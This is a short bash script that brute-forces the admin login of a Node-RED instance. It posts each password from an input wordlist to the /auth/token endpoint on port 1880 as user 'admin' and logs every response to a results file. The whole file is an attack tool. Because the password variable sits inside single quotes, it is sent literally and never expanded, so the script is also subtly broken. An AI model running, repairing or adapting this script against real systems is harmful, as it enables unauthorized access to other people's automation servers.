#!/bin/bash
if [ $# -ne 1 ];then
   echo "Usage: ./brutenodered.sh <input-file>"
   exit 1
fi

echo "running"
for pass in $(cat $1); do
	echo "$pass" >> ./results/out.txt
	curl -s http://[IP ADDRESS]:1880/auth/token --data 'client_id=node-red-admin&grant_type=password&scope=*&username=admin&password=$pass' >> ./results/out.txt
done 
echo "done"
